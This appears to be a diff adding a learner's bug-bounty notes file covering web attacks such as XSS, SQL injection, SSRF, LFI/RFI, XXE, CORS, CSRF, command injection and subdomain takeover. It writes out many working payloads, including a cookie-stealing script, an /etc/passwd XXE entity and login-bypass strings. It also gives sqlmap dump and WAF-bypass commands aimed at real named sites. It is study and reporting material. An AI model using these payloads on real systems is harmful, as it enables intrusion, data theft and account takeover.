@@ -1,0 +1,1691 @@
+1.Information Gathering
+>Site--nokia.com
+>Subdomains--virustotal.com
+>Rank the subdomains by unpopularity(try less traveled road)
+>Find ip address--ping any.com
+>Which technology the website is using(To find technologies the website is using type a command whatweb [domain_name] in the terminal)
+>Open Ports and services(nmap ipadress)
+>Server information (like iis,apache,tomcat,ngnix) (whatweb ipaddress)
+
+
+2.Basic Terminologies
+>Injection Point:-Where the attack can attack(vulnerable point)
+>vulnerability:-Flaw or weakness of system
+>Payload:-Code that is used to identify vulnerability
+>Exploitation:-taking advantage of vulnerability to gain access
+
+
+
+3.Steps to configure Burpsuite for https
+>Goto http://burp
+>Download CA certificate
+>Go to options->certificates and import it
+
+
+4.Burpsuite intruder features
+>Sniper--Only for 1 parameter
+>Battering Ram--1 payload will be tried out on all parameters
+>Cluster Bomb==one delimeter with every command in the list, then second delimeter with again  list of commands(everthing with another list)
+
+
+
+5.XSS
+When we try to input anything in the parameter and then it is reflected back then it is called Reflected XSS
+Spider feature in burpsuite can crawl all the web pages.In the spider feature we need to "spider this host" and check the parameter as almost the XSS is present there only.Spider is completed only when the form queued is 0 and the response queued is 0.
+To check the code send it to repeater and then execute the code and see the change
+
+
+When trying to do XSS on the parameters, check by what parameter bracket are they being closed 
+Like "><script>alert(1)</script>
+Sometime you have to try onto path fragment as well as on the headers whether it is reflected back or not
+>>>>>>>>>>>>>>>>>>To find bug bounty,always go to the less travelled road<<<<<<<<<<<<<<<<<<<<<<<<<
+
+
+
+Notes:-
+
+X-Powered by:-shows you the language that the website is using
+Render function in repeater does not have javascript enabled so click on show response in browser
+Parameter Tampering:-
+This is tampering done with the data or the parameters and is done with burpsuite
+Search in the field below and do data tampering
+To find sub-domains we can use "virustotal.com" website 
+Instead of alert(1) you can also write document.domain to make it much more effective
+
+
+5.1 Impact of XSS-----
+Cookie theft,phishing,keylogging,url redirection
+
+5.2 Types of XSS-----
+>Reflected XSS
+>Stored XSS
+>DOM based XSS----by just typing in the browser and not submitting it and then also the changes are there then it is a DOM based XSS
+
+5.3 Hunt for XSS:-
+Find an input parameter and pass the input and if it is stored or reflected back then there is a XSS
+Try to execute javascript code there and if it is executed then it is XSS
+Find some common page such as :-Contact Us,search bar,comment box,Forums,sign up,Login page etc.
+Try stored XSS in the field of sign up where the data is stored on the server
+
+5.4 Note:-
+Whenever the keyboard input is converted into string then use the onmouseover payload i.e. 'onmouseover='alert(1);
+#like if there are filtering the character (less than or greater than sign) you can use it to get XSS
+Also search another thing to execute XSS when there is html encoding(like button)
+
+Whenver there is a filter on the closing of the tags then use:-<svg/onload=alert(1);
+
+Whenever there is a filtering on the opening of paranthesis then convert it to html encoding charset and get the encoded character and replace it with the filtered paranthesis
+
+Whenever there is a input as a URL you can try to inject payload through a file:-test.js in which write <script>alert(1)</script>
+
+Whenever there is a filter on the form input tag and then type=text is there, we can try to convert into html encode or solve it by using "type=image src onerror="alert(1)
+
+Whenever there is a plain text try <svg> vector payload.We need to think how the code is working out
+
+Line Separator - U+2028
+Paragraph Separator - U+2029
+Whenever we are applying any type of script tag always check the parameters that were used before originally in the code like ending of the tags
+
+It is not always there that our word will only get reflected,instead the defined keyword in the website if it is reflecting then also there is a chance of XSS
+
+
+
+5.5 How to report:--
+Right click on the code which is being executed and using which vulnerability is executed
+Then select Engagement Tools->Generate CSRF POC and click on Copy HTML
+
+
+Reports:-
+vulnerability name
+Vulnerable URL
+Vulnerable Parameter
+Payload
+How to reproduce this
+Proof of COncept
+
+Also cert@ncsc.nl are good for reporting websites
+
+
+
+5.6 XSS through Head parameter:-
+In this we set the "Referer" parameter in the Request Header of Repeater . Before this we need to check whether anything we passed it is being displayed or not then we can use like referer: <js code> to the javascript code we want in the burpsuite and then show response in browser.
+eg-Referer:batman (and search for batman in the reponse)
+eg--Referer:<script>alert(1)</script>
+ 
+ 
+5.7 exploitation of XSS:-
+1. URL Redirection-----
+doucment.location.href="site name" instead of alert(1) to make it URL redirection
+
+2.Phishing through XSS
+<iframe src="site name" ></iframe> instead of the vulnerable parameter and it can embed the html page
+
+3.Cookie Stealing
+<script>documemnt.location.href("site page") +document.cookie</script> and can steal the cookie from the website have log file analyzer and can import cookie in the website using cookie injector
+
+
+4.XSS through File Uploading----
+If u have uploaded any file and the file name is being reflected onto the webpage thne u can easily rename the file and hunt for XSS
+
+5.XSS through RFI
+In this the value passed in the parameter of url="path" .We need to search for the pages which have a parameter of "url=". Instead we can change to ours page that is uploaded on the server and if the victim's website loads our page which have xss code in it, then there is XSS
+
+
+
+5.8 Self XSS---------It means that only in your browser it is being affected .but if we copy the URL and then send it to someone else then it is not being executed so this is a case of XSS.We need to pass the HTML file to get the user affected
+
+Convert Self XSS to Reflected XSS:-
+Instead of alert provide the input as document.location.href so that the page is reflected and the user is affected and then we can pass the html file to the user
+
+
+
+5.9 Prevention from XSS
+>HTML encoding
+>Other validations
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+6.Host Header attack:-
+In this type of attack the Host parameter is affected with another URL so that it is changed and the website is redirected to another website
+ 
+6.1 Steps to hunt for Host header injection---
+Look for status 200/201/202/203 etc.,300 and above while spidering the host
+Then change the host parameter to bing.com and see the change(1st method)
+Also change the host parameter to bing and insert a parameter X-Forwarded-Host to the real website(2nd method)
+Also change the host parameter to real website and insert a parameter X-Forwarded-Host to the bing.com website(3rd method)
+This is what is called Open Redirection Host header attack
+
+
+6.2 Web cache poisoning:-
+>Find a url having status code 2xx | 3xx
+>You have to try once on each 2xx and 3xx
+Changing of the URL into the host parameter and go and  if that is displayed in the code then that is web cache poisioning and also there is a change in the internal domain itself and change in the code(like bing.com becomes a clickable link)
+
+
+6.3 Host Header attack on password Reset Page 
+>You have to find password reset page
+>If page will accept username or email and if they will send u a link on your email
+
+Scenario:-
+any.com
+username - offeseivehunter
+they sent me mail having this
+reset your password by clicking on that link 
+any.com/password_reseet?code=dgdgdhjdjhgdh
+
+
+Lets take example if there is a host header attack:- 
+password reset page 
+offesivehunter@gmail.com 
+intercepted that request on burpsuite
+Change Host to hackersera.com 
+will receive a mail having same thing 	
+hackersera.com/password_reset?code=hshdghd
+
+
+6.4 XSS through host header attack:-
+In this the javascript code is inserted with the website name in the host parameter and if it is executed then the XSS is performed
+
+
+
+
+
+
+
+
+
+
+7.URL Redirection:-Is used as part of phishing attack
+Enable Redirection feature if it is disabled in the burpsuite
+Finding any URL parameter having some kind of tendency to redirect anywhere(redirection parameter)
+
+Where to find?
+>dest, redirect, path, domain, site, reference
+
+7.1 URL Redirection through GET parameter-
+In the field of "url=" (burpsuite repeater)type the another website address and let it go and if it redirected then it is a URL redirection
+
+
+7.2 URL Redirection through Path Fragments-
+In this attack the website address is passed onto the victim's URL by just applying "/website address" or double slash
+>any.com/bing.com
+>any.com//bing.com
+
+After passing into the intruder, start the attacks and search for 301(3xx) or sometimes(200 also) status--meaning redirection
+And also if the 3xx status is not getting, try with in the burpsuite->intruder->options and go for redirection(always) in the end of the menu
+
+
+
+
+
+
+
+
+8.Parameter Tampering
+In this the data is modified like user credentials,price,quantity etc.
+To be done practically and changing the cost when intercepting the request and go on until find the parameter in the search of  intercept and changes are made. and turn off the interceptor
+>cashback,amount,price,quantity etc. like fields
+
+
+
+
+
+
+9.HTML Injection:-
+It is an issue when the user is able to control an input point and is able to inject arbitary HTML code into vulnerable web page
+
+Impact of HTMl Injection:-
+It can allow attacker to modify the webpage
+DOM can be loaded there
+
+HTML Injection finding:-
+Find an input parameter either POST or GET
+If your input reflect back to you on webpage there may be HTMLi
+Execute any HTML code if you succeed to execute any HTML code there.Then there is HTMLi
+
+Exploitation of HTML injection---
+<h1>You have been hacked</h1>
+<a href="www.bing.com">Hunt</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+10. File Inclusion:-
+THis attack allows user to include a file either locally or remotely
+
+10.1 Impact of file Inclusion:-
+>Code execution on server/client
+>DOS attack
+>Information Disclosure
+
+10.2 Local file inclusion-
+anyparameter=somelocalfile
+eg:-any.com/index.php?refer=login.php
+
+10.3 Remote File Inclusion-
+anyparameter=remoteweb.com/file
+eg:-any.com/share=http://facebook.com/status?id=123414
+
+
+10.4 LFI:-
+If the target web server reside in linux platform
+server path will be /var/www/html/trump.jpeg
+because of which the data is being displayed in any.com/index.php?file=trump.jpeg
+
+To attack we can,../../../etc/password from the front end and if this is executed then there is LFI
+
+
+10.5 RFI:=
+any.com/index.php?file=http://remoteweb.com/trump.jpg
+but if the attacker changes to
+any.com/index.php?file=http://malicious.com/malicious.php
+
+
+What will be if the target server will be Windows
+then we need to find c:\boot.ini
+
+
+
+10.6 Hunting for LFI:-
+Search for the file parameter while spidering
+or use the search feature and type file= and etc. and uncheck response header and response body and check it in the request headers and in the scope only also
+
+
+10.7 Exploitation of LFI---
+Try every path
+https://github.com/D35m0nd142/LFISuite								//much helpful(python lfisuite.py)
+
+
+10.8 Exploitation of RFI------
+We just need to add the url after the "page=" parameter and if the page is responding to the external URL 
+then it is a case of RFI
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+11. Missing/insufficient SPF--(Sender Policy Framework)
+
+Sender Policy Framework, or SPF, is a technical standard that helps protect email senders and recipients from spam, spoofing, and phishing. It is a form of email authentication. Specifically, it defines a way to validate that an email message was sent from an authorized mail server, in order to detect forgery and to prevent spam. It was designed to supplement SMTP, the basic protocol used to send email, because SMTP does not itself include any authentication mechanisms.
+
+A SPF record is included in an organization’s DNS database. An SPF record is a specially formatted version of a standard DNS TXT record. An SPF record looks something like this:
+
+v=spf1 include:_spf-a.microsoft.com include:_spfb.
+microsoft.com include:_spf-c.microsoft.com
+include:_spf-ssg-a.microsoft.com include:spfa.
+hotmail.com ip4:147.243.128.24
+ip4:147.243.128.26 ip4:147.243.1.153
+ip4:147.243.1.47 ip4:147.243.1.48 -all
+
+
+If the domain have SPF then the domain is secure and if the SPF is not there then the domain in not secure
+
+
+11.1 Testing SPF
+http://www.kitterman.com/spf/validate.html
+https://mxtoolbox.com   (spf:microsoft.com)
+
+11.2 Exploitation of SPF
+You can use any fake mailer to forge the mail of vulnerable domain
+https://anonymousemail.me
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+12. Insecure CORS(Cross origin resource sharing) Configuration:-
+The CORS means that the  mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the resource originated
+Imagine the microsoft.com wants to access some data on another website, suppose site.com. This type of request traditionally wouldn’t be allowed under the browser’s Same Origin Policy. However, by supporting CORS requests, site.com can add a few special response headers that allows example.com to access the data
+
+
+12.1 Insecure CORS-(If it is found then the site is vulnerable and check for the exploitation section conditions) after the request is sent to the repeater after spidering the host
+Look for Access Control Allow Origin:--http://any.com  or * in the "response header"
+
+We can also filter the search by checking only the response headers    
+After we got send it to the repeater and check on the right hand side that is there any Access-Control-Allow-Origin
+
+
+2nd method----
+search for the "embed?" and then pass the parameter.(you can try over anywhere but 80% cases that embed? is vulnerable)
+Type a parameter in the request header and pass the parameter ORIGIN:[site name]
+and if Access-Control-Allow-Origin appears in the right hand side of the  repeater window and [sitename] appears then it is vulnerable
+
+
+If the request blocked is there then the domain is not vulnerable
+Do the spidering before and go for finding embed url
+
+
+12.2 Exploitation of CORS-
+
+1st method---
+1.POORLY IMPLEMENTED, BEST CASE FOR ATTACK:
+Access-Control-Allow-Origin: https://attacker.com
+Access-Control-Allow-Credentials: true
+
+2.POORLY IMPLEMENTED, EXPLOITABLE:
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+3.POORLY IMPLEMENTED, Not EXPLOITABLE:
+Access-Control-Allow-Origin: *
+
+
+2nd method----- 
+curl http://any.com or http://any.com/blog/wp-json (any paths) -H "Origin: http://bing.com" -I (-I for filtering of response header)
+
+After we get to know about the vulnerable domain then we need to make a CORS html file and test it using browser by just pasting the link we copied from the html file present in the folder
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+13. SSRF(Server side request forgery)------
+It refers to an attack wherein an attacker is able to send a crafted request from a vulnerable web application
+eg:-www.any.com?parameter=http://www.attacker.com
+In this the server is making request to attacker's website on behalf of the attacker so this is the case of ssrf
+(like if we make changes to the website and then request it to go any website, and if the website is visitng it. then this is a case of SSRf)
+
+13.1 Impact of SSRF:-
+Abuse Trust
+Bypass ip whitelisting
+Bypass host based authentication
+Read Resource
+Scan the internal network
+
+www.any.com?parameter=http://www.attacker.com
+www.any.com?parameter=http://localhost
+www.any.com?parameter=file://etc/password
+
+13.2 Hunting for SSRF
+You have to find any parameter that may have some kind of external interaction or they can interact to external domain 
+Example :Any.com/index/php?url=http://external.com
+
+To check that the URL is infected with the SSRF then send a request to the expressvpn/whatisyourip domain where we can get to know that the server is making the request because of which we will get the ip address of the domain and thus cross checking it.
+
+Find the subdomain and search for the parameter by unchecking response header and body
+
+13.3 Exploitation of SSRF:---
+>Read file from server----------file:/// and then just add the wordlist of different file paths we want to scan in the server`
+>Scan the Internal Network------parameter=http://localhost:21 here 21 is the internal port and it starts to interact with it
+(Checking the internal network by checking different ports)
+>SSRF with RFI---In this the attacker with the use of SSRF can just not only send request the html file instead it can load also. Therefore the attack is completed
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+14. Critical file Found:-
+Any important file found in web apps and website
+May be database password
+web server authentication data
+critical business logic information
+
+
+14.1 Hunt for Critical file vulnerability-
+>any.com/filename(Provide an identifier on the website)
+>Intercept the request and see if there is like GET /our indetifier and then send it to the intruder
+>Try the file given in the intruder and search for the status 200(if the link is working) in the intruder window
+and check if any info is leaking.
+>Enter any "parameter" after the website so that we can intrude it and then apply the intruder onto it
+>It is usually applied after the link eg:-www.hackerone.com/filename
+
+
+
+
+
+
+
+
+
+
+
+
+
+15. Source Code Disclosure:-(same as critical file vulnerability)
+Getting the source code or the configuration information that how the web application performs.
+php,asp source code 
+
+
+15.1 Hunting for source code disclosure:-
+One method is to find the list of files that are considered as critical files which give up the information
+Second method is To see the backup of any webpage, site:[site name] index.of.backup (on google)
+
+Search by unchecking response header and body
+Try the "file " parameter given in the intruder and search for the status 200 in the intruder window
+and check if any info is leaking
+Enter the parameter after the website and then apply the intruder onto it
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+16. Cross site request forgery:---
+It is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated
+
+16.1 To generate html page of csrf 
+then right click at the intercept window and go to engagement tools and click on generate CSRF poc
+and then copy the HTML and save in a file and make changes in the particular HTML file that u want the victim to take action
+
+16.2 Injection Point for CSRF
+CSRF can be GET based or POST based----but not a header based or cookie based
+Injection point is the parameter
+
+16.3 CSRF on log out page-
+To get the log out url location, right click on the browser window and copy link location of the log out option(select)
+and then send anyone so that he gets logged out
+
+16.4 CSRF on login page-
+We need to intercept the request just after clicking on login and then right click at the intercept window and go to engagement tools and click on generate CSRF poc
+
+
+
+
+
+
+
+
+
+
+
+
+
+17. Hostile sub-domain take over:-
+Hackers can claim subdomain with the help of external services and if he takes over the subdomain by purchasing from the service provider then he can steal credentials or clone the website leading to hostile sub domain takeover
+
+https://github.com/nahamsec/HostileSubBruteforcer 
+ruby sub_brute.rb
+(It works on ruby)
+(It shows where the subdomain is being redirected to, check for those services where the original company is not being used)
+(Like--facebook.nokia.com is an alias of engage.science.com)
+
+Hunting for subdomain-----
+You have to find subdomain pointing to third party
+Make sure their service is inactive or expired or cancelled 
+Goto that 3 party(like engage.science.com) where the subdomain is being registered and register there as a client and when they will ask you to point sub-domain and then just give them the name of subdomain
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+18. SQL injection:-
+In this type of attack the attacker passes the sql queries to the website directly into the user input and if it is displayed then the leakage of data can be done
+
+18.1 Injection point for SQL:-
+It can be POST/GET/Header/Cookie based
+
+1. Get based sql injection-
+Attacker have to attack through URL's parameter
+
+2. POST based sqli-
+Attackers have to find any html form that execute sql query
+like example form,sign up form,login form
+
+3. HEADER based-
+You have to attack through headers parameter such as referrer,user agent,host,location
+
+4. Cookie based-
+You have to find cookie parameter
+like cookie: username= dhgh 
+
+
+18.2 Learn Sqli Query fixing
+Use backslash (\) to balance sql query 
+
+--+ is used for commenting the after sql queries(get method)
+--<space> is ued for commenting (post based)
+
+If nothing is displayed then we need to predict what the website will be closing like ')  or ' or ':} anything
+
+
+
+
+
+1. SQLi get based-
+First make the query balanced
+Then next we need to find out the no. of coulmns by passing a command of "order by 1" until we find the no. of total columns
+Now to select after finding the no. of columns "union all select 1,2,3"
+like http://192.168.1.103/sqli-labs-master/Less-1/?id=1' order by 1  --+
+
+select id=-1' union all select 1,2,3  --+where name =xyz 
+
+execute any datbase sqli query there on that reflect no. 
+example - database(),version(),user()
+executed - http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,database(),3 --+
+http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,database(),user() --+ 
+
+
+-------------------------------------------------------------------
+There may arise a situation where the order by statements are executed but we are getting error when we pass union select statements then that may be a error based sqli or may be double based sqli
+
+
+
+
+
+
+
+2. Blind Boolean sqli-
+If there is no error being shown and only output is appearing on the basis of true or false then there may be blind boolean sqli. In this if u are true then you get the output but if you are false then no output will appear
+and 1=1 {true }
+and 1=2 {false }
+and "a"="b"
+and database()="xyz"
+
+In this then we make a substring(database(),1,1)="a"or "b" and check it one by one until the output appears 
+first character and first database
+
+
+
+
+3. Blind time based SQLI----
+In this no output or error is changed when we just give the backslash.
+To find out we need to provide sleep(n) seconds and if this is executed then we can easily extract data
+' and sleep(10) --+
+" and sleep(10) --+
+') and sleep(10) --+
+
+
+
+i gave http://192.168.1.103/sqli-labs-master/Less-9/?id=1'   and sleep(10) and database()="security" --+ its sleeping thats means 
+
+http://192.168.1.103/sqli-labs-master/Less-9/?id=1'   and sleep(10) and database()="xyz" --+ {its not sleeping for 10 sec }
+
+
+
+4. POST based sqli-
+Use --<space> or # to comment out the things
+find total no. of columns by "order by 1"
+and the same process as before
+
+
+5. Blind based boolean sqli-
+Check for true or false and then only the output will appear
+
+
+6. Time based sqli-
+same as above
+
+
+we need to replace (+) with the <space>
+
+
+7. Header based SQLi-
+If any application will have to store your headers info into their database there may be headers based sqli
+To identify the injection point we need to provide a backslash after each of the following---host|referer|location|user-agent
+
+
+8. Cookie based sqli:-
+Find cookie parameter and then go for sql injection
+
+Another method to balance the query is ' and 'x'='x
+
+
+
+
+
+
+
+18.3 Authentication bypass----------through sqli
+The error message includes the SQL query used by the login function.
+We can use this information to construct an injection attack to bypass
+authentication. The first account in a database is often an administrative
+user, we can exploit this behavior to log in as the first user in the
+database.
+provide the query where the username is empty and or condiition is given and the query is balanced
+eg----' or '1'='1
+
+lets assume background of login page 
+
+select username ='value1'&password='value2' where someother part of query 
+
+value1 = '   OR 1=1 -- 
+
+select username =''   OR 1=1 -- 	'&password='value2' where someother part of query 
+
+
+value1= 1' OR '1'='1
+
+select username ='1' OR '1'='1	'&password='value2' where someother part of query 
+
+
+
+
+
+
+
+
+
+
+18.4 Automation of SQLi:-----
+Banner grabbing-------Getting the information of server they are using,language they are using
+
+
+GET based SQLi--
+* is put after we go the injection point parameter
+python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner 
+
+
+1. database list 
+--dbs 
+
+example 
+python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner --dbs 
+
+2. find tables of a database - dvwa -D DBNAME --tables 
+
+example 
+python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner -D dvwa --tables 
+
+
+3. columns of any table - users -D DBNAME -T TBNAME --columns 
+
+example : 
+python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner -D dvwa -T users --columns 
+
+4. data of these columns - user,first_name,password 
+-D DBNAME -T TBNAME -C col1,col2,col3 --dump
+
+example : 
+
+python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner -D dvwa -T users -C user,first_name,password --dump
+
+
+
+
+
+
+
+POST based | Header Based | Cookie based sqli--
+In these based we need to copy the content after intercepting the request
+same as above
+
+python sqlmap.py -r requestfile --batch --banner 
+
+python sqlmap.py -r less11.txt --batch --banner
+
+
+
+
+WAF Bypass with sqlmap 
+
+sqlmap.py -u "URL" --batch --banner --tamper=modsecurityversioned 
+
+
+python sqlmap.py -u "http://multan.gov.pk/page.php?data=50*" --batch --banner --tamper=modsecurityversioned 
+
+Advance Command
+python sqlmap.py -u “URL” --level=5 --risk=3 --keep-alive --fresh-queries --
+random-agent --batch --banner
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+19. Command Injection:-----
+It is a type of attack where the user is able to execute the commands processed by a shell command interpreter and the code will be executed by the server
+Using this attack the attacker can take full control over the web server
+
+Use (;) to execute commands
+In this we will intercept the request and search for the parameter file= and then provide the delimeter and cmd commands
+
+19.1 Hunt for command execution ----(parameter)
+daemon ,host,upload, dir, execute, download,log, ip, cli, cmd, filename=
+
+19.2 Automating the process
+To find out directly by not doing it manually we will remove the value after the parameter and write"delimeter" and "cmd" in the intruder window and add it so that we can apply the payloads there and attack type will be the "cluster bomb" as delimeter wordlist will be there as well as cmd wordlist will be there(one delimeter with every command in the list, then second delimeter with again  list of commands)
+From the Payload set in the intruder options, upload both the payload files
+
+19.3 Exploitation of Command Injection-(Helps you to get over the OS and run any commands)
+https://github.com/commixproject/commix.git
+Syntax---python commix.py -u URL
+Example – python commix.py -u projects.knmi.nl/rico/RICO/archive/model/simfiledump.php?simfilename=
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+20. File Uploading
+In this attack, the file is uploaded which can lead to complete control over web server and client side attacks,all domain on risk
+
+20.1 Hunting of File Uploading
+In high security filename.php.jpeg and we can intercept the request and then change the "content type" to "image/jpeg" so that validation is byassed
+
+
+20.2 Any file from the below link...Its not necessary to create a web shell after uploading the file to earn bounty
+https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/maliciousimages
+(Best one is lotta pixel--for DOS attack)
+
+
+20.3 Another way of Hunting File Uploading
+Sometimes you won't able to bypass there filter
+● In this case you can try automation of file uploading(use python 3)
+● Tool Link - https://github.com/almandin/fuxploider
+Download it and run
+python3 fuxploider.py --url (paste the url of the upload page) --not-regex "wrong file type"
+
+
+
+
+
+
+
+
+
+
+21. XML External Entity Injection:---
+Using this attack we can change the logic of the XML appication
+
+
+Hunt for XML entity injection----
+Attempt to inject XML or reserved characters into input parameters and observe if XML parsing errors are generated.
+For web services, check each input parameter specified in the WSDL document for those of type XML.
+Use intruder to inject XML payloads to fetch system configuration files
+
+
+We will select the parameter which is vulnerable and then we will send it to the intruder and load the xml attack list and it can work on any of the input parameter
+Everything is done from the intruder and the repeater.
+
+
+
+
+
+
+
+
+22. Common vulnerabilities:-
+HTML Injection
+HTTP parameter Pollution
+CRLF (Carriage Return Line feed)
+CSRF (Cross site request forgery)
+Application Logic Vulnerabilities
+XSS (Cross site scripting)
+SQL (Standard Query Language)
+Open Redirect Vulnerability
+Sub Domain Takeover
+XML External Entity vulnerability
+Remote code Execution
+Template Injection( {{}} )			//we need to pass the value inside it and then it gets executed ....{{7*7}} as {{49}}
+SSRF (Server Side Request Forgery)
+
+
+
+
+
+
+23. How to Report:
+>Copy the url where there is vulnerability, like from intruder copy it
+
+Vulnerability Name : Git Repository  file found containing  critical information
+
+Vulnerable URL : paste the url
+
+How to reproduce:
+1.Visit this url
+2.It will give you the git file
+
+POC:
+Screenshot enclosed in attachment
+
+
+
+
+
+
+
+
+*********************************************************************************************
+
+//The cyber mentor (youtube)
+
+1. Five stages of Hacking 
+>Reconnaissance
+>Scanning and Enumeration
+>Gaining access
+>Maintaining access
+>Covering Tracks
+
+
+2.Reconnaissance
+>Target Validation(WHOIS,namp,nslookup,dnsrecon)
+>Finding Subdomains(Google Fu,dig,Sublist3r, Bluto, crt.sh)
+>Fingerprinting(Nmap,Wappalyzer, Whatweb, BuiltWith , Netcat)
+>Data Breaches (HaveIBeenPwned and similar list)
+
+3.Enumerating subdomains
+>Sublist3r 		(also available on apt repository--apt install sublist3r)		(python sublist3r.py -d irobot.com)
+>crt.sh         (%.irobot.com)--(% is the wildcard)
+
+4.Working with burpsuite
+>Intercept the request of irobot.com and add it to scope
+For the advanced controls, Check on Use advanced scope control and add 	.*\irobot.com$    It will show all the subdomains in scope of the burpsuite.
+>From the sublist3r domain, u can go to now any any of the subdomain and in burpsuite it will keep on showing the inscope url and we can then spider the host if we want.
+
+5.Analyze the website (scan the website)(might be used in pentester)
+>https://securityheaders.com/
+
+6.Get the technology of the website
+>Wapalyzer
+>https://builtwith.com/   
+
+7.Getting the info of the person working in company
+>https://hunter.io/
+>Linkedin
+
+8.Active scan(Should be careful with active scan)
+>nikto -h https://irobot.com    (-h for host) (not such for bug bounty, they already do it) (good for pentesting)
+#Nikto is a vulnerability scanner, easily identifiable by WAF(Web Application Firewall)
+
+9.Checking ssl-enum-ciphers (using nmap)
+>nmap -p 443 --script=ssl-enum-ciphers www.irobot.com
+#It's something that is very hard to crack, just for enumeration , if there is "F" strenghth, then it is a big issue
+
+10.Checking different ports
+nmap -p80,443 -A -T4 www.irobot.com
+
+11. Petester should also spider himself around the website..Try to get the story of the website
+Also while pentestng be a just a bit louder in scanning, how the blue team will catch the beginner scanner(script kiddie) and then go little bit quiter until stealth mode
+
+12.Web Vulnerability scanner(only demo available)
+>Netsparker
+>Acuentix 
+
+13.Robots.txt--Website tells google or the web crawler that do not crawl this page
+
+14.What can we do through XSS?
+>Steal cookies
+>Can take over sessions
+>Keylogging
+>Inject Beef Hooks
+
+15.How to prevent XSS?
+>Encoding like < == &lt; 		It becomes &lt;script>
+>Filtering is getting rid of those brackets only like <script> to script
+>Validation is removing the whole script tag
+>Sanitation is combining of all these things
+
+16.Automate way of detecting XSS vulnerability
+>xsser – XSS testing framework
+
+17.Bypassing santisation in XSS by logical thinking it
+>Also use <img src onerror=alert(1)>
+>Use <iframe src="javascript:alert('XSS')">
+
+18.Broken access control
+>In this, we can view the items of different user. Breaking the access of what we can't view.
+>eg-View another user's shopping basket
+
+We can do this by like when we select something and put in cart
+We can go to inspect element->Storage-> Session storage and then changing the value of the parameter available
+Like 'bid'(buyer id) is 6 for our account, we can change the value of 6 to 3 and then can see what is there in their account. But remember we will be logged in our account only.
+
+19.XXE-xml External Entity
+>>https://gist.github.com/staaldraad/01415b990939494879b4
+>>https://www.youtube.com/c/STOKfredrik/videos
+
+>We are attacking systems that parse XML input. We can abuse the system entity and get malicious
+>Attacks include DOS,local file disclosure, remote code execution and more. 
+
+*Example of XML file
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE gift [											### DTD--Document type Definition
+	<!ENTITY from "Heath">
+]>
+
+<gift>
+	<To>Frank</To>
+	<From>&from;</From>
+	<Item>Pokemon Cards</Item>
+</gift>
+
+
+
+*XXE payload(just an example)
+<?xml version="1.0"?>
+<!DOCTYPE Content [<!ENTITY xxs SYSTEM "file:///etc/passwd" >]>
+<body>
+	<Author>Tove</Author>
+	<Subject>Jani</Subject>
+	<Content>&xxe;</Content>
+</body>
+
+
+
+
+20.SQL injection
+>It is an attack in which malicious SQL statements are injected into a SQL Database
+>It is easy to avoid, but still happens often!!
+>If successful, we csn read sensitive databases, extract information, modify databases and potentially even get a shell.
+
+*Common SQL verbs
+>SELECT--Retrieves data from a table
+>INSERT--Adds data to a table
+>DELETE--Removes data from table
+>UPDATE--Modifies data in a table
+>DROP--Delete a table
+>UNION--combines data from multiple queries
+
+>WHERE--filter records based on specific condition
+>AND/OR/NOT--Filter records based on multiple conditions
+>ORDER BY--Sorts records in ascending/descending order
+
+' and "" --string delimiters
+-- , /* , # --comment delimiters
+* and % --wildcards
+; --ends SQL statement
+Plus a bunch of others that follow programmatic logic ( = , + , > ,< , () etc.)
+
+21. Learning SQLi
+Input: test
+SQL: SELECT * from Users WHERE email=='test';
+
+Input:test' or 1=1; --
+SQL: SELECT * from Users WHERE email=='test' or 1=1; --';
+
+Using the above command, the first user in the table gets logged in. It's not about 1=1, it's by default as we are using *.
+We can use instead of SELECT frank from Users
+
+>>List available to put under Intruder---https://github.com/danielmiessler/SecLists (contains usernames,passwords and other lists)
+200 status in intruder means Okay ..Also the length is different from others
+
+
+
+21.Registering as admin user
+>Register as a normal user and intercept the request
+>Send it to repeater and check the repsonse
+>If there is response coming with registered data "isAdmin:false" .Try to change it
+>Type in repeater that "isAdmin:true" and again see the response, it might happen that user status is changed to Admin
+
+22.Seeing  CAPTCHA's answers
+>Getting the GET/POST request under Network tab of inspect Element
+>Select the captcha request and just besides it Go to response tab
+
+23. Adding something into other's basket(Broken Access control)
+>Intercept the request of adding the product into ours basket
+>Send it to repeater
+>In the line where it says the product id, basket id, quantity ..Add another basket id parameter in the same format as that and the value is different basket it and then send.
+>It might include that product into another
+
+24.Providing feedback as different customer
+>Go to the feedback page
+>Inspect element and then get to the user Id (will be a hidden field) .Edit it and remove the "hidden"
+>U will get the user id, change it and then pass the feedback
+
+25.Character escaping--It is done to prevent from ""(double quotes) understanding
+"email":"<iframe src=\"javascript:alert('XSS')\">"
+
+26.Uploading the higher filesize(check that the validation is at server side or client side)
+>When uploading the file, upload it and intercept the request
+>Then u will get the request and get the data about what is being uploaded.
+>Put the larger text by pasting there and then forward all the packets.
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+****************************************************************************************************
+
+
+
+
+
+#Web vulnerability
+
+#Web vulnerability scanner
+1.nikto						//nikto --help
+2.Wordpress scanning----wpscan -u 192.168.10.12 -e(enumerate usernames) u vp(vulnerable plugins)
+3.Nessus					//We can also prepare report with the customize name and the custom logo for better reporting
